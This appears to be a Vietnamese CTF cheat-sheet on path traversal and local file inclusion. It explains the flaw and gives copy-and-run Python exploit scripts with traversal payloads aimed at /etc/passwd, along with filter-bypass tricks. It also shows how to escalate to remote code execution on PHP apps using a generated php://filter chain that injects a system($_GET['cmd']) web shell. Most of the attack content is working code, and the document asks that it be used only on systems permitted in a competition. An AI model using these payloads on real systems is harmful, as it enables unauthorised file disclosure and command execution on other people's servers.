# Path Traversal / LFI (đọc file ngoài thư mục cho phép)

Một số trang có chức năng cho tải file về dựa theo tên bạn gửi lên, ví dụ `/download?file=report.pdf` sẽ trả về file `report.pdf` nằm trong 1 thư mục cố định trên server. Nếu server không kiểm tra, bạn có thể gõ `../../../../etc/passwd` thay vì `report.pdf` — dấu `../` nghĩa là "lùi lên 1 cấp thư mục cha", gõ nhiều lần sẽ "đi" ra khỏi thư mục cho phép và chạm tới file hệ thống thật, như file `/etc/passwd` (file chứa danh sách người dùng trên Linux, thường dùng để test vì luôn có sẵn). Đây gọi là Path Traversal (đi lạc ra ngoài đường dẫn cho phép) hay LFI — Local File Inclusion (đọc/nhúng 1 file có sẵn trên máy chủ mà đáng ra không được đọc).

Trên Burp bạn nhận ra lỗi này khi: tham số dạng tên file/đường dẫn (`file=`, `path=`, `page=`, `template=`...), khi bạn đổi giá trị thành `../../../../etc/passwd`, response trả về nội dung file `/etc/passwd` thật (có dòng bắt đầu bằng `root:`) thay vì file gốc hoặc lỗi 404.

## Snippet copy-là-chạy

```python
import requests

base = "http://target"
s = requests.Session()
s.verify = False

def solve_one(session, base_url):
    # 3 cách viết khác nhau cho cùng 1 mục đích "đi lùi ra khỏi thư mục cho phép":
    # - raw: viết thường, hay bị server/WAF chặn vì quá rõ ràng
    # - %2f: encode ký tự "/" thành dạng URL-encode, lách khi server lọc chuỗi "../" thô
    # - tuyệt đối "/etc/passwd": thử luôn khi server ghép đường dẫn kiểu lạ, không cần "../"
    payloads = [
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "/etc/passwd",
    ]
    for p in payloads:
        r = session.get(f"{base_url}/download", params={"file": p}, timeout=5)
        # "root:" là dòng đầu quen thuộc trong file /etc/passwd thật trên Linux -> dấu hiệu đã đọc được file
        if "root:" in r.text:
            print("DÍNH LFI với payload:", p)
            print(r.text[:300])
            return r.text
        print(p, "->", r.status_code, "len=", len(r.text))
    return None


if __name__ == "__main__":
    print(solve_one(s, base))
```

## Giải thích cho người mới

- 3 payload trong list ứng với 3 cách "viết lại" cùng 1 ý định traversal, phòng trường hợp server lọc đúng 1 kiểu viết mà quên kiểu khác — ví dụ server chặn chuỗi `"../"` xuất hiện trong input, nhưng không chặn khi nó được encode thành `..%2f`, rồi mới decode ra `../` **sau** khi đã qua bộ lọc.
- `params={"file": p}`: dùng lại đúng cách gửi query string đã học ở `01_GET_Query.md` — `requests` tự encode các ký tự đặc biệt trong `p`; nếu cách encode tự động này khác với payload bạn copy từ Burp (ví dụ bạn cần giữ nguyên `%2f` viết hoa/thường), chuyển sang gửi raw URL như mục "Lưu ý nhanh" ở file đó.
- `"root:" in r.text`: file `/etc/passwd` thật trên Linux luôn có dòng bắt đầu bằng `root:x:0:0:...` — kiểm tra chuỗi này là cách nhanh nhất để biết script đã đọc được file thật, chứ không phải chỉ đọc được 1 trang lỗi 404 có chữ "not found" trông giống thành công.
- Vòng `for` dừng ngay (`return`) khi gặp payload đúng, các payload còn lại không cần thử tiếp — tiết kiệm thời gian khi chạy cho nhiều đội.

## Từ LFI (đọc file) lên RCE (chạy lệnh) bằng `php_filter_chain_generator` — chỉ áp dụng app PHP

Nếu đích là PHP (thấy đuôi `.php` hoặc header `X-Powered-By: PHP`), và bạn đọc được file nhưng muốn CHẠY LỆNH THẬT thay vì chỉ đọc, có 1 kỹ thuật không cần upload file: lợi dụng PHP filter `php://filter/...` để tự "làm hỏng" dữ liệu đúng cách sao cho PHP in ra đúng đoạn code PHP bạn muốn — rồi chính lỗi LFI include lại đoạn vừa in ra đó, PHP tưởng đó là file PHP thật và CHẠY nó. Tool `php_filter_chain_generator` tại `~/hoc/CTF/Tools/web/php_filter_chain_generator/` tự sinh đúng chuỗi filter này (tự viết tay gần như không thể vì chuỗi filter dài hàng nghìn ký tự):

```bash
spwn
cd ~/hoc/CTF/Tools/web/php_filter_chain_generator

# Sinh chuỗi filter mà khi PHP đọc qua, sẽ in ra đúng đoạn code PHP chạy lệnh theo tham số ?cmd=
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

Lệnh trên in ra 1 chuỗi dài bắt đầu bằng `php://filter/convert.iconv...`. Dùng chuỗi đó làm GIÁ TRỊ cho đúng tham số bị lỗi LFI (ví dụ `?page=`), rồi gọi thêm tham số `cmd` để chạy lệnh:

```python
import requests

base = "http://target"
filter_chain = "php://filter/convert.iconv...(dán nguyên chuỗi tool in ra)...resource=php://temp"

r = requests.get(base + "/index.php", params={"page": filter_chain, "cmd": "id"}, timeout=5)
print(r.text[-500:])   # kết quả lệnh "id" thường nằm ở cuối response, sau phần rác do quá trình convert sinh ra
```

- Chuỗi filter chỉ cần sinh **1 lần** cho 1 đoạn code PHP cố định (`system($_GET["cmd"])`) — dùng lại được cho mọi lệnh sau đó, chỉ cần đổi giá trị `cmd=` mỗi lần gọi, không cần sinh lại chuỗi filter.
- Kỹ thuật này KHÔNG cần ghi được file nào lên server (khác hẳn File_Upload.md) — chỉ cần app có chỗ `include($_GET['page'])`/`require(...)` không kiểm tra, đây là lý do nó nguy hiểm hơn LFI đọc file thường.

## Lưu ý nhanh

- Nếu cả 3 payload đều thất bại, thử thêm: double-encode (`%252f`), null byte cũ (`%00` — ít gặp ở hệ thống mới), hoặc tăng/giảm số lượng `../` (server có thể tự cắt bớt 1 vài tầng).
- Với mục tiêu chạy Windows, đổi `/etc/passwd` thành `..\\..\\windows\\win.ini` và dấu hiệu nhận biết đổi thành chuỗi `[fonts]` (dòng đầu file `win.ini` thật).
- Nếu response trả 200 nhưng rỗng hoặc không có `"root:"`, có thể file được đọc đúng chỗ nhưng không phải file bạn nghĩ — in `r.text[:300]` ra xem thực tế là gì trước khi đổi payload khác.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
